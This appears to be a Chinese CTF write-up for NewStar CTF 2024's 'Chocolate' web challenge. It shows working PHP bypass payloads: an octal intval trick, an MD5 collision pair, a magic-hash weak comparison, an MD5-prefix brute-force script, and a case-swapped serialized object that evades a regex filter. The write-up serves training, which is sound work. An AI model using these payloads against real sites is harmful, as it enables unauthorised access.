---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---
<script setup>
import Container from '@/components/docs/Container.vue'
</script>

# Chocolate

## 0x00 Hint 起手

首页分为四个部分<span data-desc>（可可液块、可可脂、黑可可粉、糖粉）</span>对应四个小 PHP 考点

因为有实际背景，在可可液块一栏中只要输入了小于等于 0 这一**不符合现实的量**，就会出现 hint<span data-desc>（就像某些支付漏洞一样）</span>：

> 或许可以问问经验最丰富的 Mr.0ldStar

<Container type='quote'>

为了减小难度，实际填入的值小于 10 就会有这个提示
</Container>

根据提示，访问 `0ldStar.php`

```php
<?php
global $cocoaLiquor_star;
global $what_can_i_say;
include("source.php");
highlight_file(__FILE__);

printf("什么?想做巧克力?");

if(isset($_GET['num'])) {
    $num = $_GET['num'];
    if($num==="1337") {
        die("可爱的捏");
    }
    if(preg_match("/[a-z]|\./i", $num)) {
        die("你干嘛");
    }
    if(!strpos($num, "0")) {
        die("orz orz orz");
    }
    if(intval($num, 0)===1337) {
        print("{$cocoaLiquor_star}\n");
        print("{$what_can_i_say}\n");
        print("牢师傅如此说到");
    }
}
```

这里考点是八进制绕过检测，过滤了十六进制的字母以及小数的小数点

传入 `num=+02471` 即可，这个时候会输出

```plaintext
// 可可液块 (g): 1337033
// gur arkg yriry vf : pbpbnOhggre_fgne.cuc, try to decode this 牢师傅如此说到
```

## 0x02 可可脂

`gur arkg yriry vf : pbpbnOhggre_fgne.cuc, try to decode this` 是 ROT13 加密，为新生可能遇到的文件读取 ROT13 加密作个铺垫，可以在这熟悉一下（直接当普通移位密码也能试出来）

ROT13 解密之后是 `the next level is : cocoaButter_star.php`，进入 `cocoaButter_star.php`

```php
<?php
global $cocoaButter_star;
global $next;
error_reporting(0);
include "source.php";

$cat=$_GET['cat'];
$dog=$_GET['dog'];

if(is_array($cat) || is_array($dog)){
    die("EZ");
}else if ($cat !== $dog && md5($cat) === md5($dog)){
    print("of course you konw");
}else {
    show_source(__FILE__);
    die("ohhh no~");
}

if (isset($_POST['moew'])){
    $miao = $_POST['moew'];
    if($miao == md5($miao)){
        echo $cocoaButter_star;
    }
    else{
        die("qwq? how?");
    }
}

$next_level = $_POST['wof'];

if(isset($next_level) && substr(md5($next_level), 0, 5) === '8031b'){
    echo $next;
}
```

第一步是一个 MD5 的强相等，这里可以在网上搜到，比如

```plaintext
cat=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

dog=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

第二步是一个 MD5 嵌套之后的相等，也就是找到一个 `a` 使得 `a == md5(a)`<span data-desc>（弱比较）</span>

可以网上找，也可以脚本爆破，这里传的是 `moew=0e215962017`

最后一步稍微难点，需要新生写一个脚本去枚举出一个字符串，令其计算 MD5 值后前几位等于 `8031b`，以下脚本供参考

```python
import hashlib
from multiprocessing.dummy import Pool as ThreadPool

# MD5 截断数值已知，求原始数据
# 例子 substr(md5(captcha), 0, 6) = '60b7ef'
def md5(s):  # 计算MD5字符串
    return hashlib.md5(str(s).encode('utf-8')).hexdigest()


keymd5 = '8031b' # 已知的 md5 截断值
md5start = 0 # 设置题目已知的截断位置
md5length = 5

def findmd5(sss): # 输入范围 里面会进行 md5 测试
    key = sss.split(':')
    start = int(key[0]) # 开始位置
    end = int(key[1]) # 结束位置
    result = 0
    for i in range(start, end):
        # print(md5(i)[md5start:md5length])
        if md5(i)[0:5] == keymd5: # 拿到加密字符串
            result = i
            print(result) # 打印
            break


list=[] # 参数列表
for i in range(10): # 多线程的数字列表开始与结尾
    list.append(str(10000000*i) + ':' + str(10000000*(i+1)))
pool = ThreadPool() # 多线程任务
pool.map(findmd5, list) # 函数与参数列表
pool.close()
pool.join()
```

这里跑出来的结果 `60066549`，那么传参可以是

```plaintext
cat=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

dog=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

moew=0e215962017

wof=60066549
```

## 0x03 黑可可粉

怕有人放弃，这里直接命名 `final`，成功就在眼前了

```php
<?php

include "source.php";
highlight_file(__FILE__);
$food = file_get_contents('php://input');

class chocolate{
    public $cat='???';
    public $kitty='???';
    public function __construct($u, $p){
        $this->cat=$u;
        $this->kitty=$p;
    }
    public function eatit(){
        return $this->cat===$this->kitty;
    }

    public function __toString(){
        return $this->cat;
    }

    public function __destruct(){
        global $darkCocoaPowder;
        echo $darkCocoaPowder;
    }
}

$milk=@unserialize($food);
if(preg_match('/chocolate/', $food)){
    throw new Exception("Error $milk", 1);
}
```

简单的反序列化，甚至不需要亲自去构造 pop 链

首先 `unserialize($food)` 这里的 `food` 是 `$food = file_get_contents('php://input');`

需要用 BurpSuite 等工具进行发包<span data-desc>（先抓包，然后在数据包的 HTTP Body 处填上序列化之后的内容，HTTP Method 最好选 POST）</span>

在我们可以控制的参数 `$food` 被反序列化并将结果存入 `$milk` 后，又对 `$food` 做了额外的检查：如果 `$food` 带有 `chocolate`，那么就会被程序抛出异常。这里我们可以通过大小写绕过对字符串的过滤

然后深入分析一下

1. 这里用户名和密码虽然是 `???`，但是单引号包裹字符串，是固定的

2. 构造函数，`eatit()` 中明显没有命令执行的地方

3. `__toString()` 函数返回值因为是 `$cat`，也就是 `???`，同样没有实际意义，但是第一次做的师傅可以简单了解这个魔术方法

   :::tip 关于 __toString()

   1. 输出格式不对触发（强制类型转换时）
   2. 表达方式错误导致魔术方法触发
   3. 常用于构造 POP 链

   :::

   ```php
   $a = new test(); // $a 是对象
   print_r($a);     // 调用对象可以用 print_r() 或 var_dump()
   echo $a;         // 触发，把对象当成字符串调用
   ```

4. `__destruct()` 析构函数，也是魔术方法

简单来说就是这个类的实例被销毁时触发（执行）这个函数，也就是我们通过实例化一个正确的 `chocolate` 类，等到这个实例被 PHP 销毁，就自然输出我们可能需要的内容了<span data-desc>（`echo $darkCocoaPowder;`）</span>，实际上这个参数的值在 `index.php` 中抓包或者分析源码也能看出这就是黑可可粉的参数

传入 `O:9:"ChocoLate":2:{s:8:"username";s:3:"???";s:8:"password";s:3:"???";}`<span data-desc>（至少有一个字母大写即可）</span>，输出 `// 黑可可粉 (g): 51540`

参考：

```php
<?php
class chocolate {
    public $username='???';
    public $password='???';
}
$c = new chocolate();
$a = str_replace("chocolate", "ChocoLate", serialize($c));
var_dump($a);
```

到这里，没有下一个页面信息，其实套娃也结束了

## 0x04 糖粉

目前为止就得到了三个参数的正确值，但是还缺少一个，这时候回到验证页面（首页），正确填写了三个值之后，任意填一个 `糖粉` 的值，页面会返回 `太苦` 或者 `太甜`<span data-desc>（布尔盲注）</span>

收集到这个信息后，参考前三个都是整数值，这里也大致可以预计是整数值，通过<strong>二分法</strong>预计几分钟之内就能轻松拿到正确答案：2042

四个值:

- 1337033
- 202409
- 51540
- 2042

填入之后就会给 flag
